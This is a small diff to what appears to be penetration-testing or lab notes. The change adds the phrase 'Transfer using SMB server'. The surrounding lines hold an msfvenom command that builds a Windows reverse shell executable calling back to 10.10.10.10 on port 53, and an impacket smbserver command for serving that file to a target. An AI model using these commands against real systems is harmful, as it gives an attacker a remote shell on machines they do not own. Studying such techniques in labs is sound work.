@@ -5,7 +5,7 @@ On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Updat
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
 
-On Kali, in the same directory as reverse.exe
+Transfer using SMB server. On Kali, in the same directory as reverse.exe
 ```JavaScript
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 ```
